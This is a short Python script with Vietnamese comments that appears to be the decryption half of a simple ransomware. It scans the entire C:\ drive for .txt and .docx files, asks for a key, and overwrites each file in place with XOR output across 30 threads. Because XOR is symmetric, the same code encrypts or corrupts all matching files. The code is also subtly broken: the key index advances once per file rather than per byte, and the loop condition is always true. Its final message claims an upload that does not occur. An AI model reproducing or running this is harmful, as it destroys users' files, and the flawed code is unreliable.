from concurrent.futures import thread
import os
from threading import Thread
from queue import Queue

#Phan mo rong tep de ma hoa
encrypted_ext = ('.txt','.docx')

#Tra ve tat ca file tu may
file_paths = []
for root, dirs, files in os.walk('C:\\'):
    for file in files:
        file_path, file_ext = os.path.splitext(root +'\\'+file)
        if file_ext in encrypted_ext:
            file_paths.append(root+'\\'+file)

key = input("Vui long dien khoa neu muon file tro lai: ")

#Giai ma file
def encrypt(key):
    while q.not_empty:
        file = q.get()
        print(f'Giai ma {file}')
        index = 0
        max_index = len(key) - 1
        try:
            # pass
            # encrypted_data = ''
            with open(file, 'rb') as f: #rb la de doc file theo kieu nhi phan
                data = f.read()
            with open(file, 'wb') as f:
                for byte in data:
                    xor_byte = byte ^ ord(key[index])
                    f.write(xor_byte.to_bytes(1, 'little'))#xor_byte la so nguyen nen can chuyen thanh byte
                #Tang khoa
                if index >= max_index:
                    index = 0
                else:
                    index += 1
            print(f'{file} Giai ma thanh cong!!!')
        except:
            # pass
            print(f'Giai ma khong thanh cong {file} :(((((')
        q.task_done()

q = Queue()
for file in file_paths:
    q.put(file)
for i in range(30):
    thread = Thread(target=encrypt, args=(key,), daemon=True)
    thread.start()

q.join()
print('Giai ma va tai len hoan tat!!!')